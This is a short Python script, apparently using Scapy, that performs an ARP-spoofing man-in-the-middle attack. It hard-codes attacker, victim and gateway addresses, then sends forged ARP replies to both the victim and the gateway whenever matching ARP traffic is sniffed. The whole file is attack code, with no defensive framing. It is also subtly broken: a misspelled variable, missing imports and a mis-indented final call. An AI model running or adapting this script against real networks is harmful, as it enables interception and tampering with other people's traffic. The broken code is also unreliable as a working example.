#!/usr/local/bin/python

'''
ARP MitM
'''

# Setting variables
attacker = ("10.0.0.231", "00:14:38:00:00:01")
victim = ("10.0.0.209", "00:14:38:00:00:02")
gateway = ("10.0.0.1", "00:19:56:00:00:01")




def ARP_MitM(pkt):
	# opcode 2 is 'reply'
	# https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml#arp-parameters-1
	spoof_victim = ARP(op=2, psrc=gateway[0], pdst=victim[0], hwdst=victime[1])
	spoof_gateway = ARP(op=2, psrc=victim[0], pdst=gateway[0], hwdst=gateway[1])
	
	send(spoof_victim)
	send(spoof_gateway)


 # Wait for a ARP replies from the default GW
 sniff(iface="enp0s3", prn=ARP_MitM, filter="arp and host {} or host {}".format(gateway[0], victim[0]), count=1, store=0)